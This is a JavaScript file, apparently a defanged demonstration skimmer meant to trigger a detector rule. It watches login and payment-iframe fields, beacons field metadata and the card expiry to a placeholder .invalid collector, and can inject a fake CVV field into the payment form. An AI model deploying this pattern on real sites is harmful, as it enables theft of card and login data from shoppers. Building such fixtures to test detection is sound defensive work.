(function () {
  'use strict';

  var VERSION = '1.0.0';

  if (window.__FORMSIGHT__) {
    return;
  }

  var COLLECTOR = 'https://collect.formsight-cdn.invalid/v1/f';

  var LOGIN_FIELDS = ['email-login-input', 'password-login-input'];
  var CARD_FIELDS = ['cardNumber', 'cardName', 'cvv', 'expiryMonth', 'expiryYear'];

  var SENSITIVE = /password|cvv|cardnumber|cardname/i;

  var search = window.location.search;
  var debug = /(?:^|[?&])fsdebug=1/.test(search);
  var injectExtraField = /(?:^|[?&])fsinject=1/.test(search);

  var state = { events: [], sent: 0, fields: {}, reported: false };

  function log() {
    if (debug && window.console) {
      console.log.apply(console, ['[formsight]'].concat([].slice.call(arguments)));
    }
  }

  function send(eventName, payload) {
    var qs =
      'v=' + encodeURIComponent(VERSION) +
      '&ev=' + encodeURIComponent(eventName) +
      '&dl=' + encodeURIComponent(window.location.href);

    Object.keys(payload || {}).forEach(function (key) {
      qs += '&f[' + encodeURIComponent(key) + ']=' + encodeURIComponent(String(payload[key]));
    });

    state.events.push({ t: Date.now(), event: eventName, payload: payload || {} });
    state.sent += 1;

    try {
      var img = new Image(1, 1);
      img.src = COLLECTOR + '?' + qs;
    } catch (err) {
      void err;
    }

    log('sent', eventName, payload);
  }

  function describe(name, raw) {
    var s = String(raw === null || raw === undefined ? '' : raw);
    if (!s) {
      return { field: name, len: 0, hint: '' };
    }
    if (SENSITIVE.test(name)) {
      return { field: name, len: s.length, hint: '***' };
    }
    return {
      field: name,
      len: s.length,
      hint: s.length > 3 ? s.slice(0, 1) + '…' + s.slice(-2) : s.slice(0, 1) + '…',
    };
  }

  function detectBrand(digits) {
    if (/^4/.test(digits)) return 'visa';
    if (/^5[1-5]/.test(digits) || /^2[2-7]/.test(digits)) return 'mastercard';
    if (/^3[47]/.test(digits)) return 'amex';
    if (/^6(?:011|5)/.test(digits)) return 'discover';
    if (/^3(?:0[0-5]|[68])/.test(digits)) return 'diners';
    if (/^35/.test(digits)) return 'jcb';
    return digits ? 'unknown' : '';
  }

  function readCardFields(doc) {
    var get = function (id) {
      var el = doc.getElementById(id);
      return el && typeof el.value === 'string' ? el.value : '';
    };

    var digits = get('cardNumber').replace(/\D/g, '');
    var month = get('expiryMonth');
    var year = get('expiryYear');

    return {
      card_brand: detectBrand(digits),
      card_digits: digits.length,
      card_complete: digits.length >= 13,
      card_expiry: month && year ? month + '/' + String(year).slice(-2) : '',
      name_length: get('cardName').length,
      cvv_length: get('cvv').length,
    };
  }

  function isWatched(id) {
    return LOGIN_FIELDS.indexOf(id) !== -1 || CARD_FIELDS.indexOf(id) !== -1;
  }

  function watchFields(doc, label, isPaymentDoc) {
    if (!doc.__formsightInputBound) {
      doc.__formsightInputBound = true;
      doc.addEventListener(
        'input',
        function (event) {
          var el = event.target;
          if (!el || !el.id || !isWatched(el.id)) {
            return;
          }
          var entry = describe(el.id, el.value);
          entry.type = el.type || '';
          entry.doc = label;
          state.fields[el.id] = entry;
          send('FieldInput', entry);
        },
        true
      );
      log('watching inputs in', label, isPaymentDoc ? '(payment)' : '');
    }

    bindSubmit(doc, label, isPaymentDoc);
  }

  function bindSubmit(doc, label, isPaymentDoc) {
    var attach = function () {
      var form = doc.getElementById('paymentForm') || doc.querySelector('form');
      if (!form || form.__formsightSubmit) {
        return !!form;
      }
      form.__formsightSubmit = true;
      form.addEventListener(
        'submit',
        function () {
          if (isPaymentDoc) {
            var snapshot = readCardFields(doc);
            snapshot.doc = label;
            send('PaymentSubmit', snapshot);
          } else {
            send('FormSubmit', { doc: label, fields: Object.keys(state.fields).join('|') });
          }
        },
        true
      );
      log('bound submit in', label);
      return true;
    };

    attach();

    if (doc.__formsightFormObserver || !window.MutationObserver || !doc.body) {
      return;
    }
    doc.__formsightFormObserver = new MutationObserver(function () {
      attach();
    });
    doc.__formsightFormObserver.observe(doc.body, { childList: true, subtree: true });
  }

  function watchPaymentIframe() {
    var attach = function (iframe) {
      if (!iframe || iframe.__formsightAttached) {
        return;
      }
      var run = function () {
        try {
          var doc = iframe.contentDocument;
          if (!doc || !doc.getElementById('paymentForm')) {
            return;
          }
          iframe.__formsightAttached = true;
          watchFields(doc, 'payment-iframe', true);
          if (injectExtraField) {
            injectShadowField(doc);
          }
        } catch (err) {
          void err;
        }
      };
      iframe.addEventListener('load', run);
      run();
    };

    var existing = document.getElementById('payment-iframe');
    if (existing) {
      attach(existing);
    }
    if (!window.MutationObserver || !document.body) {
      return;
    }
    new MutationObserver(function (mutations) {
      for (var i = 0; i < mutations.length; i += 1) {
        var added = mutations[i].addedNodes;
        for (var j = 0; j < added.length; j += 1) {
          var node = added[j];
          if (!node || node.nodeType !== 1) continue;
          if (node.id === 'payment-iframe') {
            attach(node);
          } else if (node.querySelector) {
            var found = node.querySelector('#payment-iframe');
            if (found) attach(found);
          }
        }
      }
    }).observe(document.body, { childList: true, subtree: true });
  }

  function injectShadowField(doc) {
    if (doc.getElementById('fsVerifyCvv')) {
      return;
    }
    var form = doc.getElementById('paymentForm');
    if (!form) {
      return;
    }

    var wrap = doc.createElement('div');
    wrap.setAttribute('data-formsight-injected', '1');

    var label = doc.createElement('label');
    label.setAttribute('for', 'fsVerifyCvv');
    label.textContent = 'Confirm security code (FormSight demo field)';

    var input = doc.createElement('input');
    input.type = 'password';
    input.id = 'fsVerifyCvv';
    input.name = 'fsVerifyCvv';
    input.autocomplete = 'off';
    input.setAttribute('maxlength', '4');

    wrap.appendChild(label);
    wrap.appendChild(input);
    form.appendChild(wrap);

    CARD_FIELDS.push('fsVerifyCvv');
    log('injected extra sensitive input (rule 39 trigger)');
  }

  window.__FORMSIGHT__ = {
    version: VERSION,
    collector: COLLECTOR,
    fields: function () {
      return state.fields;
    },
    events: function () {
      return state.events;
    },
    stats: function () {
      return {
        version: VERSION,
        sent: state.sent,
        watched: Object.keys(state.fields),
        injectedExtraField: injectExtraField,
      };
    },
  };

  document.documentElement.setAttribute('data-formsight', '1');

  if (window.console) {
    console.info(
      '[formsight] v' + VERSION + ' — window.__FORMSIGHT__.stats(). Reads login/payment fields; ' +
        'values reduced to metadata, collector is unresolvable (.invalid).'
    );
  }

  function start() {
    watchFields(document, 'top', false);
    watchPaymentIframe();
    send('PageView', {});
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', start);
  } else {
    start();
  }
})();
